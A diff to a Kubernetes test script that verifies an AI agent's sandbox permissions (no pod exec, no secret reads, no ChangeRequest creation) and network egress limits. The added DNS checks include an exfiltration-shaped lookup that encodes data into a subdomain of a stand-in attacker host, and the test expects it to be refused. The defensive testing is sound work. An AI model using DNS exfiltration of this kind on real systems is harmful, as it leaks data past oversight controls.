@@ -6,7 +6,7 @@
 set -euo pipefail
 source "$(dirname "$0")/lib.sh"
 cd "$(dirname "$0")/.."
-AS=system:serviceaccount:agent:agent
+AS=system:serviceaccount:agent:runner
 FAILED=0
 pass() { echo "PASS  $1"; }
 fail() { echo "FAIL  $1"; FAILED=1; }
@@ -29,7 +29,7 @@ sleep 2
 left=$(kubectl get sandboxclaim -n sandboxes -o name | grep 'agent-agent-demo' || true)
 [ -z "$left" ] && pass "no leftover claim" || fail "leftover claim: $left"
 
-echo "--- RBAC (as the agent's service account)"
+echo "--- RBAC (as the runner agent's service account)"
 can() { kubectl auth can-i "$@" --as=$AS 2>/dev/null || true; }
 expect() { # want, description, can-i args...
   local want=$1 desc=$2; shift 2
@@ -44,6 +44,7 @@ expect no  "may not claim in another namespace"      create sandboxclaims.extens
 expect no  "may not get pods"                        get pods -n sandboxes
 expect no  "may not exec into pods"                  create pods/exec -n sandboxes
 expect no  "may not read secrets"                    get secrets -n agent
+expect no  "may not propose ChangeRequests (the proposer's job)" create changerequests.approval.safe-ops.io -n approvals
 
 echo "--- claim admission policy (server-side dry run as the agent)"
 claim() { # extra-spec-yaml
@@ -94,18 +95,28 @@ spec:
     - |
       import socket
       for name, h, p in [("sandbox executor", "$SB_IP", 8888), ("API server", "$API_IP", 443),
-                         ("internet", "1.1.1.1", 443), ("cluster DNS", "$DNS_IP", 53),
-                         ("sandbox other port", "$SB_IP", 22)]:
+                         ("internet", "1.1.1.1", 443), ("sandbox other port", "$SB_IP", 22)]:
           try:
               socket.create_connection((h, p), timeout=3); print(name, "OPEN")
           except Exception as e:
               print(name, "BLOCKED", type(e).__name__)
+      # DNS reaches kube-dns only through Cilium's proxy, which answers the
+      # gateway's name (P3) and refuses every other: no lookups to carry
+      # data out. Absolute names (trailing dot): no search domains.
+      for name, q in [("DNS gateway name", "llm-gateway.gateways.svc.cluster.local."),
+                      ("DNS other cluster name", "kubernetes.default.svc.cluster.local."),
+                      ("DNS exfil-shaped name", "c2VjcmV0.attacker.example.com.")]:
+          try:
+              socket.gethostbyname(q); print(name, "RESOLVED")
+          except Exception as e:
+              print(name, "REFUSED", type(e).__name__)
     securityContext: {allowPrivilegeEscalation: false, readOnlyRootFilesystem: true, capabilities: {drop: ["ALL"]}}
 YAML
 kubectl wait -n agent pod/egress-test --for=jsonpath='{.status.phase}'=Succeeded --timeout=120s >/dev/null || true
 eg=$(kubectl logs -n agent egress-test)
 kubectl delete pod -n agent egress-test --wait=false >/dev/null
-for want in "sandbox executor OPEN" "API server OPEN" "internet BLOCKED" "cluster DNS BLOCKED" "sandbox other port BLOCKED"; do
+for want in "sandbox executor OPEN" "API server OPEN" "internet BLOCKED" "sandbox other port BLOCKED" \
+            "DNS gateway name RESOLVED" "DNS other cluster name REFUSED" "DNS exfil-shaped name REFUSED"; do
   grep -q "^$want" <<<"$eg" && pass "$want" || fail "$want: got $(grep "^${want% *}" <<<"$eg")"
 done
 
